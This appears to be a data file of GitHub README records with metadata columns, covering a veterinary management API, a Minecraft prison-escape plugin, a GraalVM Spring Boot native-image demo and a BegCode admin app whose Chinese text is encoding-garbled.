      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/thson58""><img src=""https://avatars.githubusercontent.com/u/152074875?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Nguyen Son</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://allcontributors.org""><img src=""https://avatars.githubusercontent.com/u/46410174?v=4"" width=""100px;"" alt=""""/><br /><sub><b>All Contributors</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://imgbot.net""><img src=""https://avatars.githubusercontent.com/u/31427850?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Imgbot</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://www.codefactor.io""><img src=""https://avatars.githubusercontent.com/u/13309880?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Automated code reviews</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/AnkitaGhosh2000""><img src=""https://avatars.githubusercontent.com/u/152983487?v=4"" width=""100px;"" alt=""""/><br /><sub><b>AnkitaGhosh2000</b></sub></a></td>
	</tr>
	<tr>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/SaibalCts23""><img src=""https://avatars.githubusercontent.com/u/153187590?v=4"" width=""100px;"" alt=""""/><br /><sub><b>SaibalCts23</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/AdrishOfHogwarts""><img src=""https://avatars.githubusercontent.com/u/152976845?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Adrish Bose</b></sub></a></td>
    </tr>
  </tbody>
</table>

<!-- markdownlint-restore -->
<!-- prettier-ignore-end -->

<!-- ALL-CONTRIBUTORS-LIST:END -->

## Licenses:

- [Sale Dock](https://github.com/hardingadonis/saledock) is under the [Apache-2.0 license](https://github.com/hardingadonis/saledock/blob/main/LICENSE).
- [favicon](https://github.com/hardingadonis/saledock/blob/main/src/main/webapp/assets/images/favicon/favicon.png) is under the [flaticon](https://www.flaticon.com/free-icon/sale_791968).
",10,0,2,113.0,"['sale', 'dock', 'requirement', 'database', 'development', 'clone', 'sale', 'dock', 'open', 'sale', 'dock', 'build', 'sale', 'dock', 'maven', 'optional', 'deployment', 'contributor', 'license']","['sale', 'dock', 'requirement', 'database', 'development']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-war-plugin]",1.0,0.0,0.0
deerborg/VeterinaryManagementAPI,main,"# Veterinary Management API

## Overview
This project is a Veterinary Management API designed to manage various aspects of a veterinary practice, including appointments, doctors, customers, and animal records. The project is implemented in Java and follows a RESTful architecture.

## Project Structure
The project is organized into several packages, each serving a different purpose. Here is an overview of the key packages and their functionalities:

- **Core Configuration**
    - Security: Contains security configurations.
    - Web Config: Configurations for the web layer.
    - Model Mapper: Configurations for model mapping.

- **Exceptions**
    - Defines custom exceptions for various error scenarios such as:
        - AppointmentAlreadyExists
        - NotFoundAnimalException
        - And others.

- **Controllers**
    - Handles incoming HTTP requests and maps them to appropriate service methods. Key controllers include:
        - CustomerController
        - DoctorController
        - AppointmentController
        - And others.

- **Services**
    - Contains business logic and service methods. Key services include:
        - CustomerService
        - DoctorService
        - AppointmentService
        - And others.

- **Models**
    - Defines the data models for the application. Key models include:
        - Customer
        - Doctor
        - Appointment
        - And others.

- **Repositories**
    - Interfaces for CRUD operations on data models. Key repositories include:
        - CustomerRepository
        - DoctorRepository
        - AppointmentRepository
        - And others.

- **Configurations**
    - Contains configuration classes for various aspects of the application. Key configurations include:
        - SecurityConfig
        - WebConfigurer
        - ModelMapperConfig
        - And others.

## How to Run
1. Clone the repository.
2. Navigate to the project directory.
3. Build the project using Maven:
   ```bash
   mvn clean install
   ```
4. Run the application:
   ```bash
   mvn spring-boot:run
   ```

## Dependencies
- Spring Boot
- Spring Security
- Spring MVC
- Spring Data JPA
- Validation
- Lombok
- ModelMapper
- Hibernate
- JPA

## Endpoints
Here is a list of key endpoints provided by the API:

- **Customer**
    - `GET /customers`: Get all customers.
    - `POST /customers`: Create a new customer.
    - `GET /customers/{id}`: Get customer by ID.

- **Doctor**
    - `GET /doctors`: Get all doctors.
    - `POST /doctors`: Create a new doctor.
    - `GET /doctors/{id}`: Get doctor by ID.

- **Appointments**
    - `GET /appointments`: Get all appointments.
    - `POST /appointments`: Create a new appointment.
    - `GET /appointments/{id}`: Get appointment by ID.

- **Animals**
    - `GET /animals`: Get all animals.
    - `POST /animals`: Create a new animal record.
    - `GET /animals/{id}`: Get animal by ID.

## Error Handling
The application uses a global exception handler to manage errors and provide meaningful responses to the client.

## Interface

In this project, MVC (Model-View-Controller) architecture is used. The interface components are located under a ""resources"" folder, which contains HTML, CSS, and JavaScript files. According to the MVC architecture:

- **Model:** Data models and business logic reside here.
- **View:** User interface components are found here. These components include HTML files and associated CSS and JavaScript files.
- **Controller:** Controllers are used to handle incoming requests and manage interaction between the model and view.

To access the interface components of the project, you can follow these steps:

1. Navigate to the ""resources"" folder in the project directory.
2. Inside this folder, you will find model, view, and controller components according to the MVC structure.
3. You can start using the interface by opening the relevant HTML, CSS, and JavaScript files in a web browser.

If you have any questions or feedback regarding the interface of the project, please feel free to contact us.

**DEMO IMAGES:**

**Login**
<img src =""assets/login.png""/>

**Register**
<img src =""assets/register.png""/>

**Main**
<img src =""assets/main.png""/>

**Panel**
<img src =""assets/management_panel.png""/>

**Create**
<img src =""assets/create_model_form.png""/>

**Update-Delete**
<img src =""assets/update_delete_model_form.png""/>


## License
This project is licensed under the MIT License.
",0,0,1,0.0,"['veterinary', 'management', 'api', 'overview', 'project', 'structure', 'how', 'run', 'dependency', 'endpoint', 'error', 'handle', 'interface', 'license']","['veterinary', 'management', 'api', 'overview', 'project']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
TiagoFar78/PrisonEscape,master,"# Prison Life Minigame Plugin

## Description
This Minecraft plugin replicates ""Prison Life"" game on Steam. Players join a server with 3-11 other players, each receiving a random role. The objective is simple: prisoners must work together to escape the prison within 4 days, while guards must prevent them from doing so.

## Features
- **Flexible Player Count**: Support for 3-11 players.
- **Role Assignment**: Players can be assigned roles such as prisoners or guards, each with their own objectives and gameplay mechanics.
- **Objective-based Gameplay**: Guards must prevent prisoners from escaping, while prisoners must work together to evade guards and break out of the prison.
- And more to come!

## Contributing
Contributions to the development of this plugin are welcome! If you encounter any bugs or have suggestions for new features, please open an issue or submit a pull request on GitHub.

Please note that if you want to work on an issue, leave a comment, and we will assign it to you.

### Building

To build PrisonEscape, you need JDK 17 or higher installed on your system.

Clone this repository, then run the following command:

```s
mvn install
```

You can then find the .jar file of PrisonEscape in the `target/` directory.

### Formatting

This project uses [Spotless](https://github.com/diffplug/spotless) to ensure code formatting rules
are followed.

It is possible to check if the code adheres to the formatting rules by running:

```s
mvn spotless:check
```

Or, alternatively, format the code:

```s
mvn spotless:apply
```

To ensure consistency and maintainability, please make sure that your code is properly formatted and compiles successfully before submitting a pull request.

For a more in detail explanation on how to run your local copy please go to the [TestServer folder](/TestServer/).

**Thank you for your contributions!** ğŸ˜Š

## Credits
- **Plugin Developers**:
  - [TiagoFar78](https://github.com/TiagoFar78)
  - [Raquel Braunschweig](https://github.com/iquelli)

## License

This project is licensed under the GNU General Public License (GPL). See the [LICENSE](LICENSE) file for details.",2,13,1,142.0,"['prison', 'life', 'minigame', 'plugin', 'description', 'feature', 'contribute', 'building', 'format', 'credit', 'license']","['prison', 'life', 'minigame', 'plugin', 'description']",1.0,"[com.diffplug.spotless:spotless-maven-plugin,maven-clean-plugin,maven-compiler-plugin,maven-deploy-plugin,maven-install-plugin,maven-jar-plugin,maven-project-info-reports-plugin,maven-resources-plugin,maven-site-plugin,maven-surefire-plugin]",0.0,1.0,0.0
yubb-ai/unofficial-gpt4,main,"# Spring Boot Native Image Microservice

This demo shows how to build, package, and run a simple Spring Boot 3 microservice from a JAR file with the GraalVM JDK,
and from a native executable with GraalVM Native Image. The benefits of using a native executable are faster start-up
times and reduced memory consumption. It also demonstrates how to run the application and build the native executable
within a Docker container.

There are two ways to generate a native executable from a Spring Boot application:

- [Using GraalVM Native Build Tools](https://docs.spring.io/spring-boot/docs/current/reference/html/native-image.html#native-image.developing-your-first-application.native-build-tools)
- [Using Buildpacks](https://docs.spring.io/spring-boot/docs/current/reference/html/native-image.html#native-image.developing-your-first-application.buildpacks)

## Sample Application

The example is a minimal REST-based API application, built on top of Spring Boot 3. It consists of:

- `com.example.jibber.JibberApplication`: the main Spring Boot class. It is also a REST controller which serves as an
  entry-point for HTTP requests.
- `com.example.jibber.Jabberwocky`: a utility class that implements the logic of the application.

If you call the HTTP endpoint, `/jibber`, it will return some nonsense verse generated in the style of the Jabberwocky
poem, by Lewis Carroll. The program achieves this by using a Markov Chain to model the original poem (this is
essentially a statistical model). This model generates a new text. The example application provides the text of the
poem, then generates a model of the text, which the application then uses to generate a new text that is similar to the
original text. The application uses the [RiTa library](https://rednoise.org/rita/) as an external dependency to build
and use Markov Chains.

By default, the demo uses
the [Native Build Tools Maven plugin](https://graalvm.github.io/native-build-tools/latest/maven-plugin.html) to perform
the tasks. If you would like to run this demo
using [BuildPacks](https://docs.spring.io/spring-boot/docs/current/reference/html/native-image.html#native-image.developing-your-first-application.buildpacks),
the build configuration is provided for you too.

## Prerequisites

1. Download and install the latest GraalVM JDK using [SDKMAN!](https://sdkman.io/).
    ```bash
    sdk install java 21.0.2-graal
    ```

2. (Optional) Install and run a Docker-API compatible container runtime such
   as [Rancher Desktop](https://docs.rancherdesktop.io/getting-started/installation/), [Docker](https://www.docker.io/gettingstarted/),
   or [Podman](https://podman.io/docs/installation). If you are using Docker, configure it
   to [allow non-root user access](https://docs.docker.com/engine/install/linux-postinstall/#manage-docker-as-a-non-root-user)
   if you are on Linux.

3. Download the demos repository or clone it as follows:

    ```bash
    git clone https://github.com/graalvm/graalvm-demos
    ```

4. Change directory to the demo subdirectory:

    ```bash
    cd spring-native-image
    ```

## Application JAR

### Build and Run as a JAR

This demo is built using Maven.

1. Build the application on top of a JVM:

    ```shell
    ./mvnw clean package
    ```

   It generates a runnable JAR file that contains all of the applicationâ€™s dependencies and also a correctly
   configured `MANIFEST` file.

2. Run the application JAR and put it into the background by appending `&`:

    ```shell
    java -jar ./target/benchmark-jibber-0.0.1-SNAPSHOT.jar &
    ```

3. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or call the endpoint
   using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

   It should generate a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

4. Bring the application to the foreground using `fg`, and then enter `<CTRL-c>` to terminate the application.

### (Optional) Containerize the JAR

The following steps (5-8) show how you can easily containerize the JAR built in the previous step using the Oracle
GraalVM JDK container image `container-registry.oracle.com/graalvm/jdk:17-ol8`.

5. Run this command to package the JAR as a Docker container:

    ```shell
    docker build -f Dockerfiles/Dockerfile.jvm --build-arg APP_FILE=benchmark-jibber-0.0.1-SNAPSHOT.jar -t jibber-benchmark:jvm.0.0.1-SNAPSHOT .
    ```

6. Run the container:

    ```shell
    docker run --rm --name graal -p 8080:8080 jibber-benchmark:jvm.0.0.1-SNAPSHOT
    ```

7. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or from a new
   terminal window, call the endpoint using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

   You should get a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

8. To stop the application, first get the container id using `docker ps`, and then run:

    ```shell
    docker rm -f <container_id>
    ```

## Native Executable

Recap what you have so far: built a Spring Boot application with an HTTP endpoint, and successfully containerised it.
Now you will look at how you can create a native executable from your application.

Spring Boot 3's built-in support for GraalVM Native Image makes it easy to compile a Spring Boot 3 application into a
native executable.

This native executable not only starts faster but also uses far fewer resources than running the application as a JAR
file.

You can use the `native-image` tool from the GraalVM installation to build a native executable.
In this example, you'll use
the [GraalVM Native Build Tools for Maven](https://graalvm.github.io/native-build-tools/latest/maven-plugin.html) to
build a native executable.

### Default Native Build Configuration

Make sure youâ€™re using `spring-boot-starter-parent` in order to inherit the out-of-the-box `native` profile, and
the `org.graalvm.buildtools:native-maven-plugin` plugin.

You should see the following in the Maven `pom.xml` file:

``` xml
<parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>3.2.0</version>
    <relativePath/> <!-- lookup parent from repository -->
</parent>
```

``` xml
<build>
    <plugins>
        <plugin>
            <groupId>org.graalvm.buildtools</groupId>
            <artifactId>native-maven-plugin</artifactId>
        </plugin>
        ...
    </plugins>
</build>
```

The out-of-the-box `native` profile
has [GraalVM Reachability Metadata](https://www.graalvm.org/native-image/libraries-and-frameworks/) enabled by default.

### Build and Run as a Native Executable

With the out-of-the-box `native` profile active, you can invoke the `native:compile` goal to trigger native-image
compilation.

1. Run the following command:

    ```shell
    ./mvnw native:compile -Pnative
    ```

   The `native` profile is used to generate a native executable for your platform. The native executable is called
   _benchmark-jibber_ and is generated in the _target_ directory.

   > Alternatively, to build using BuildPacks, run the `./mvnw spring-boot:build-image -Pnative` command to generate a
   native executable. For more information about using BuildPacks to create a native executable,
   see [Building a Native Image Using Buildpacks](https://docs.spring.io/spring-boot/docs/current/reference/html/native-image.html#native-image.developing-your-first-application.buildpacks).

2. Run the native executable and put it into the background by appending `&`:

    ```shell
    ./target/benchmark-jibber &
    ```

3. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or call the endpoint
   using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

   You should get a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

4. Bring the application to the foreground using `fg`, and then enter `<CTRL-c>` to terminate the application.

From the log output, notice how much quicker the native executable version of this Spring Boot application starts
compared to the JAR. The native executable also uses fewer resources than running from a JAR file.

### Additional Native Build Configuration

Notice that you can pass additional configuration arguments to the underlying `native-image` build tool using
the `<buildArgs>` section. In individual `buildArg` tags, you can pass parameters exactly the same way as you do from a
command line. This lets you use all of the parameters that work with the `native-image` tool from Maven.

Add the following snippet to the pom.xml to pass additional arguments to enable verbose output, quick build mode, etc.
over and above the out-of-the-box `native` profile.

```xml
<profiles>
   <profile>
      <id>native</id>
      <build>
         <plugins>
            <plugin>
               <groupId>org.graalvm.buildtools</groupId>
               <artifactId>native-maven-plugin</artifactId>
               <!--<version>0.9.28</version>-->
               <configuration>
                  <verbose>true</verbose>
                  <quickBuild>true</quickBuild>
                  <buildArgs combine.children=""append"">
                     <arg>-H:+ReportExceptionStackTraces</arg>
                  </buildArgs>
               </configuration>
            </plugin>
         </plugins>
      </build>
   </profile>
</profiles>
```

### Build and Run as a Native Executable

Let's rebuild the native executable with the additional configuration arguments.

1. Run the following command:

    ```shell
    ./mvnw native:compile -Pnative
    ```

   With the quick build mode enabled, it takes less time to build the native executable. This mode should be used in
   development for faster builds.

2. Run the native executable and put it into the background by appending `&`:

    ```shell
    ./target/benchmark-jibber &
    ```

3. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or call the endpoint
   using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

   You should get a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

4. Bring the application to the foreground using `fg`, and then enter `<CTRL-c>` to terminate the application.

From the log output, notice how much quicker the native executable version of this Spring Boot application starts
compared to the JAR. The native executable also uses fewer resources than running from a JAR file.

### (Optional) Containerize the Native Executable on Linux

The following steps (5-8) are for Linux only.

5. On Linux, you can easily containerise the native executable using the following command:

    ```shell
    docker build -f Dockerfiles/Dockerfile.native --build-arg APP_FILE=benchmark-jibber -t jibber-benchmark:native.0.0.1-SNAPSHOT .
    ```

6. Run the application:

    ```shell
    docker run --rm --name native -p 8080:8080 jibber-benchmark:native.0.0.1-SNAPSHOT
    ```

7. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or from a new
   terminal window, call the endpoint using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

   It should generate a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

8. To stop the application, first get the container id using `docker ps`, and then run:

    ```shell
    docker rm -f <container_id>
    ```

### (Optional) Use Multistage Docker Builds to Build a Native Image and Package it in a Lightweight Container

The following steps (9-12) are for all platforms - MacOS, Windows, and Linux.

For MacOS and Windows, to build a Docker image containing your native executable, you need to build the native
executable inside a Docker container. To do this, we've provided
a [multistage Docker build file](./Dockerfiles/Dockerfile).

9. Run this command to build the native executable within a Docker container:

    ```shell
    docker build -f Dockerfiles/Dockerfile -t jibber-benchmark:native.0.0.1-SNAPSHOT .
    ```

10. Run the application:

    ```shell
    docker run --rm --name native -p 8080:8080 jibber-benchmark:native.0.0.1-SNAPSHOT
    ```

11. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or from a new
    terminal window, call the endpoint using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

    It should generate a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

12. To stop the application, first get the container id using `docker ps`, and then run:

    ```shell
    docker rm -f <container_id>
    ```

## Measure the Performance of the Application and Metrics

The Spring Actuator dependency has been added to the project, along with support for Prometheus. If you want to test the
performance of either the JVM version, or the native executable version of the application, you can make use of the
Prometheus support. If you are hosting the application locally, it is available on port 8080:

[http://localhost:8080/actuator/prometheus](http://localhost:8080/actuator/prometheus)

## Related Documentation

- Run an interactive
  lab: [Level Up your Spring Boot Java Application with GraalVM](https://luna.oracle.com/lab/268ea851-2f09-43e6-8d70-40a10cb4de03)
- [Maven Build Plugin for GraalVM Native Image](https://graalvm.github.io/native-build-tools/latest/maven-plugin.html/)
- [Spring Boot GraalVM Native Image Support](https://docs.spring.io/spring-boot/docs/current/reference/html/native-image.html)
",10,0,1,0.0,"['spring', 'boot', 'native', 'image', 'microservice', 'sample', 'application', 'prerequisite', 'application', 'jar', 'build', 'run', 'jar', 'optional', 'containerize', 'jar', 'native', 'executable', 'default', 'native', 'build', 'configuration', 'build', 'run', 'native', 'executable', 'additional', 'native', 'build', 'configuration', 'build', 'run', 'native', 'executable', 'optional', 'containerize', 'native', 'executable', 'linux', 'optional', 'use', 'multistage', 'docker', 'build', 'build', 'native', 'image', 'package', 'lightweight', 'container', 'measure', 'performance', 'application', 'metric', 'related', 'documentation']","['native', 'build', 'executable', 'application', 'jar']",1.0,"[org.graalvm.buildtools:native-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
begcode/begcode-admin,main,"# monolithMybatis

æœ¬åº”ç”¨ç¨‹åºç”±BegCode8.6.2ç”Ÿæˆ, ä½ å¯ä»¥åœ¨ [https://www.begcode.com](https://www.begcode.com) æ‰¾åˆ°æ–‡æ¡£å’Œå¸®åŠ©ã€‚

## æˆªå›¾å±•ç¤º

### ç™»å½•

![ç™»å½•](./doc/images/login.png)

### é¦–é¡µ

![é¦–é¡µ](./doc/images/index.png)

### èœå•åˆ—è¡¨

![èœå•åˆ—è¡¨](./doc/images/view_permission.png)

### è§’è‰²åˆ—è¡¨

![è§’è‰²åˆ—è¡¨](./doc/images/authority.png)

### ç”¨æˆ·åˆ—è¡¨

![ç”¨æˆ·åˆ—è¡¨](./doc/images/user-list.png)

### çŸ­ä¿¡é…ç½®

![çŸ­ä¿¡é…ç½®](./doc/images/sms_config.png)

### å›¾ç‰‡ä¸Šä¼ 

![å›¾ç‰‡ä¸Šä¼ ](./doc/images/upload_image.png)

### å­—å…¸ç®¡ç†

![å­—å…¸ç®¡ç†](./doc/images/dictionary.png)

### æ“ä½œæ—¥å¿—

![æ“ä½œæ—¥å¿—](./doc/images/sys_log.png)

### æ¶ˆæ¯å‘å¸ƒ

![æ¶ˆæ¯å‘å¸ƒ](./doc/images/announcement.png)

### Apiåˆ—è¡¨

![Apiåˆ—è¡¨](./doc/images/api.png)

### Iconé€‰æ‹©å‚è€ƒ

![Iconé€‰æ‹©å‚è€ƒ](./doc/images/icon_picker.png)

### æŸ¥çœ‹é€šçŸ¥

![æŸ¥çœ‹é€šçŸ¥](./doc/images/notice.png)

## é¡¹ç›®ç»“æ„

ç”Ÿæˆæ—¶éœ€è¦ Nodeï¼Œå¹¶å»ºè®®åœ¨å¼€å‘è¿‡ç¨‹ä¸­ä½¿ç”¨å®ƒã€‚package.json æ–‡ä»¶å§‹ç»ˆä¼šç”Ÿæˆï¼Œä»¥æä¾›æ›´å¥½çš„å¼€å‘ä½“éªŒï¼ŒåŒ…æ‹¬ prettierã€commit hooksã€è„šæœ¬ç­‰ç­‰ã€‚

åœ¨é¡¹ç›®çš„æ ¹ç›®å½•ä¸­ï¼ŒJHipsterä¼šç”Ÿæˆç”¨äºé…ç½®è¯¸å¦‚gitã€prettierã€eslintã€huskyç­‰ä¼—å¤šå¸¸è§å·¥å…·çš„é…ç½®æ–‡ä»¶ã€‚ä½ å¯ä»¥åœ¨ç½‘ç»œä¸Šæ‰¾åˆ°æœ‰å…³è¿™äº›å·¥å…·çš„å‚è€ƒæ–‡æ¡£ã€‚

`/src/*` ç›®å½•ç»“æ„éµå¾ªé»˜è®¤çš„Javaç»“æ„ã€‚

- `.yo-rc.json` - Yeomané…ç½®æ–‡ä»¶ï¼ˆBegCode/JHipsteré…ç½®æ–‡ä»¶ï¼‰
  BegCodeçš„é…ç½®å­˜å‚¨åœ¨keyä¸ºgenerator-begcodeçš„å±æ€§ä¸­ï¼Œè¿™é‡Œå®šä¹‰äº†BegCodeç”Ÿæˆå™¨çš„å…¨å±€é…ç½®ã€‚æ­¤å¤–ï¼Œä½ å¯èƒ½ä¼šåœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹çš„.yo-rc.jsonæ–‡ä»¶ä¸­æ‰¾åˆ°ç±»ä¼¼generator-begcode-\*çš„è“å›¾é…ç½®ï¼Œå®ƒåŒ…å«äº†é¡¹ç›®ç‰¹å®šçš„é…ç½®é€‰é¡¹ã€‚
- `.yo-resolve` (å¯é€‰) - Yeoman å†²çªè§£å†³å™¨
  å…è®¸åœ¨å‘ç°å†²çªæ—¶ä½¿ç”¨ç‰¹å®šæ“ä½œï¼Œè·³è¿‡åŒ¹é…æ¨¡å¼çš„æ–‡ä»¶çš„æç¤ºã€‚æ¯ä¸€è¡Œåº”è¯¥åŒ¹é… [æ¨¡å¼] [æ“ä½œ]ï¼Œå…¶ä¸­æ¨¡å¼æ˜¯ä¸€ä¸ª Minimatch æ¨¡å¼ï¼Œæ“ä½œæ˜¯ skipï¼ˆå¦‚æœçœç•¥åˆ™ä¸ºé»˜è®¤æ“ä½œï¼‰æˆ–è€… force ä¸­çš„ä¸€ä¸ªã€‚ä»¥ # å¼€å¤´çš„è¡Œè¢«è§†ä¸ºæ³¨é‡Šï¼Œå°†è¢«å¿½ç•¥ã€‚
- `.jhipster/*.json` - JHipsterå®ä½“é…ç½®æ–‡ä»¶

- `npmw` - ç”¨äºæœ¬åœ°å®‰è£…çš„npmçš„åŒ…è£…å™¨
  JHipsteré»˜è®¤ä½¿ç”¨æ„å»ºå·¥å…·åœ¨æœ¬åœ°å®‰è£…Nodeå’Œnpmã€‚æ­¤åŒ…è£…å™¨ç¡®ä¿æœ¬åœ°å®‰è£…npmå¹¶ä½¿ç”¨å®ƒï¼Œé¿å…äº†ä¸åŒç‰ˆæœ¬å¯èƒ½å¼•èµ·çš„ä¸€äº›å·®å¼‚ã€‚é€šè¿‡ä½¿ç”¨./npmwè€Œä¸æ˜¯ä¼ ç»Ÿçš„npmï¼Œæ‚¨å¯ä»¥é…ç½®ä¸€ä¸ªæ— éœ€Nodeçš„ç¯å¢ƒæ¥å¼€å‘æˆ–æµ‹è¯•æ‚¨çš„åº”ç”¨ç¨‹åºã€‚
- `/src/main/docker` - åº”ç”¨ç¨‹åºåŠå…¶ä¾èµ–çš„æœåŠ¡çš„Dockeré…ç½®

## å¼€å‘

The build system will install automatically the recommended version of Node and pnpm.

We provide a wrapper to launch pnpm.
ä»…å½“ [package.json](package.json) ä¸­çš„ä¾èµ–é¡¹å‘ç”Ÿæ›´æ”¹æ—¶ï¼Œæ‚¨æ‰éœ€è¦å†æ¬¡è¿è¡Œæ­¤å‘½ä»¤ã€‚

```
./npmw install
```

æˆ‘ä»¬ä½¿ç”¨ pnpm è„šæœ¬å’Œ [Vite][] ä½œä¸ºæˆ‘ä»¬çš„æ„å»ºç³»ç»Ÿã€‚

åœ¨ä¸¤ä¸ªå•ç‹¬çš„ç»ˆç«¯ä¸­è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œä»¥åˆ›å»ºæ›´å¥½çš„å¼€å‘ä½“éªŒï¼Œå…¶ä¸­å½“ç¡¬ç›˜ä¸Šçš„æ–‡ä»¶å‘ç”Ÿæ›´æ”¹æ—¶æ‚¨çš„æµè§ˆå™¨è‡ªåŠ¨åˆ·æ–°ã€‚

```
./mvnw
./npmw start
```

Npm è¿˜ç”¨äºç®¡ç†æ­¤åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨çš„ CSS å’Œ JavaScript ä¾èµ–é¡¹ã€‚ æ‚¨å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å‡çº§ä¾èµ–é¡¹
åœ¨ [package.json](package.json) ä¸­æŒ‡å®šè¾ƒæ–°ç‰ˆæœ¬ã€‚ æ‚¨è¿˜å¯ä»¥è¿è¡Œ`pnpm update`å’Œ`pnpm install`æ¥ç®¡ç†ä¾èµ–é¡¹ã€‚
åœ¨ä»»ä½•å‘½ä»¤ä¸Šæ·»åŠ `help`æ ‡å¿—ä»¥æŸ¥çœ‹å¦‚ä½•ä½¿ç”¨å®ƒã€‚ ä¾‹å¦‚ï¼Œ`pnpm help update`ã€‚

`./npmw run` å‘½ä»¤å°†åˆ—å‡ºå¯ç”¨äºè¯¥é¡¹ç›®è¿è¡Œçš„æ‰€æœ‰è„šæœ¬ã€‚

## ç³»ç»Ÿæ„å»º

### åˆ›å»ºJaråŒ…

è¦ä¼˜åŒ–monolithMybatisåº”ç”¨ç¨‹åºåˆ›å»ºJaråŒ…å¹¶è¿›è¡Œç”Ÿäº§éƒ¨ç½²ï¼Œè¯·è¿è¡Œï¼š

```
./mvnw package -Pprod clean verify -DskipTests
```

è¿™å°†å‹ç¼©å®¢æˆ·ç«¯å’Œé‡æ–°æ‰“åŒ…CSSå’ŒJavaScriptæ–‡ä»¶ã€‚ å®ƒè¿˜å°†ä¿®æ”¹`index.html`ï¼Œä»¥ä¾¿å¼•ç”¨è¿™äº›æ–°æ–‡ä»¶ã€‚
ä¸ºäº†ç¡®ä¿ä¸€åˆ‡æ­£å¸¸ï¼Œè¯·è¿è¡Œï¼š

```
java -jar target/*.jar
```

ç„¶ååœ¨æµè§ˆå™¨æ‰“å¼€ï¼š[http://localhost:8080](http://localhost:8080)ã€‚

è¯·å‚é˜…[Using JHipster in production][] äº†è§£æ›´å¤šè¯¦ç»†ä¿¡æ¯ã€‚

### åˆ›å»ºWaråŒ…

è¦å°†æ‚¨çš„åº”ç”¨ç¨‹åºæ‰“åŒ…ä¸º war ä»¥ä¾¿å°†å…¶éƒ¨ç½²åˆ°åº”ç”¨ç¨‹åºæœåŠ¡å™¨ï¼Œè¯·è¿è¡Œï¼š

```
./mvnw package -Pprod,war clean verify
```

### JHipster Control Center

JHipster Control Center å¯ä»¥å¸®åŠ©æ‚¨ç®¡ç†å’Œæ§åˆ¶æ‚¨çš„åº”ç”¨ç¨‹åºã€‚ æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯åŠ¨æœ¬åœ°æ§åˆ¶ä¸­å¿ƒæœåŠ¡å™¨ï¼ˆå¯é€šè¿‡ http://localhost:7419 è®¿é—®ï¼‰ï¼š

```
docker compose -f src/main/docker/jhipster-control-center.yml up
```

## æµ‹è¯•

### Spring Boot tests

To launch your application's tests, run:

```
./mvnw verify
```

### Client tests

Unit tests are run by [Jest][]. They're located in [front/src/test/javascript/](front/src/test/javascript/) and can be run with:

```
./npmw test
```

## å…¶ä»–

### ä½¿ç”¨Sonarè¿›è¡Œä»£ç è´¨é‡æ§åˆ¶

Sonarç”¨äºåˆ†æä»£ç è´¨é‡ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯åŠ¨æœ¬åœ° Sonar æœåŠ¡å™¨ï¼ˆå¯é€šè¿‡ http://localhost:9001 è®¿é—®ï¼‰ï¼š

```
docker compose -f src/main/docker/sonar.yml up -d
```

Note: we have turned off forced authentication redirect for UI in [src/main/docker/sonar.yml](src/main/docker/sonar.yml) for out of the box experience while trying out SonarQube, for real use cases turn it back on.

You can run a Sonar analysis with using the [sonar-scanner](https://docs.sonarqube.org/display/SCAN/Analyzing+with+SonarQube+Scanner) or by using the maven plugin.

Then, run a Sonar analysis:

```
./mvnw -Pprod clean verify sonar:sonar -Dsonar.login=admin -Dsonar.password=admin
```

If you need to re-run the Sonar phase, please be sure to specify at least the `initialize` phase since Sonar properties are loaded from the sonar-project.properties file.

```
./mvnw initialize sonar:sonar -Dsonar.login=admin -Dsonar.password=admin
```

Additionally, Instead of passing `sonar.password` and `sonar.login` as CLI arguments, these parameters can be configured from [sonar-project.properties](sonar-project.properties) as shown below:

```
sonar.login=admin
sonar.password=admin
```

For more information, refer to the [Code quality page][].

### Using Docker to simplify development (optional)

You can use Docker to improve your JHipster development experience. A number of docker-compose configuration are available in the [src/main/docker](src/main/docker) folder to launch required third party services.

For example, to start a mysql database in a docker container, run:

```
docker compose -f src/main/docker/mysql.yml up -d
```

To stop it and remove the container, run:

```
docker compose -f src/main/docker/mysql.yml down
```

You can also fully dockerize your application and all the services that it depends on.
